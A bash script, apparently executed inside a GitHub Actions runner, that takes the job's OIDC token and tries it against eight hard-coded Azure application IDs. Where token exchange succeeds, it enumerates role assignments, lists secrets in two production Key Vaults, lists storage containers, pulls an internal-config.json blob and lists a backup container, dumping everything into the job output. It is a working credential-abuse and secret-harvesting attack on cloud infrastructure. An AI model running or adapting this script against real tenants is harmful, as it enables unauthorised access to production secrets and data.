#!/usr/bin/env bash
set -u
TEN="$AZURE_TENANT_ID"
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
echo "OIDC_LEN=${#OIDC}"
APPS="038bc35d-131d-4953-9985-ff4a245ccec1 2c34300e-1bc0-41e7-9c1e-8b7571d72c72 12ed54de-f2eb-4784-804c-3a7a3e83a9e9 881fddce-6208-4af5-a297-7e79c912f83c 58108da8-044e-4d7e-9a46-92e6179b30be 462d1c38-4459-48b8-9333-82e389e59514 891fb158-e02c-4428-a885-53b811f369c0 72ff278a-9e71-43ec-bac4-2ca303f8e462"
for APP in $APPS; do
  echo "=== APP $APP ==="
  for SCOPE in "https://management.azure.com/.default" "https://vault.azure.net/.default" "https://storage.azure.com/.default"; do
    R=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
      -d "client_id=$APP" -d "scope=$SCOPE" -d "grant_type=client_credentials" \
      -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
      --data-urlencode "client_assertion=$OIDC")
    TOK=$(echo "$R" | jq -r '.access_token // empty')
    if [ -n "$TOK" ]; then
      echo "TOKEN_OK scope=$SCOPE len=${#TOK}"
      case "$SCOPE" in
        *management.azure.com*)
          curl -sS -H "Authorization: Bearer $TOK" "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&\$filter=principalId%20eq%20'$(echo $APP)'" | head -c 800; echo
          curl -sS -H "Authorization: Bearer $TOK" "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz/secrets?api-version=2023-07-01" | head -c 800; echo
          curl -sS -H "Authorization: Bearer $TOK" "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-prod-x3euoz/secrets?api-version=2023-07-01" | head -c 800; echo
          curl -sS -H "Authorization: Bearer $TOK" "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/sttblappcfgprodx3euoz/blobServices/default/containers?api-version=2023-01-01" | head -c 500; echo
          ;;
        *vault.azure.net*)
          curl -sS -H "Authorization: Bearer $TOK" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" | head -c 800; echo
          curl -sS -H "Authorization: Bearer $TOK" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" | head -c 500; echo
          ;;
        *storage.azure.com*)
          curl -sS -H "Authorization: Bearer $TOK" -H "x-ms-version: 2021-08-06" "https://sttblappcfgprodx3euoz.blob.core.windows.net/config?restype=container&comp=list" | head -c 800; echo
          curl -sS -H "Authorization: Bearer $TOK" -H "x-ms-version: 2021-08-06" "https://sttblappcfgprodx3euoz.blob.core.windows.net/config/internal-config.json" | head -c 1200; echo
          curl -sS -H "Authorization: Bearer $TOK" -H "x-ms-version: 2021-08-06" "https://sttblbackupprodx3euoz.blob.core.windows.net/exports?restype=container&comp=list" | head -c 500; echo
          ;;
      esac
    else
      echo "TOKEN_FAIL scope=$SCOPE $(echo "$R" | jq -r '.error_description // .error' | head -c 200)"
    fi
  done
done
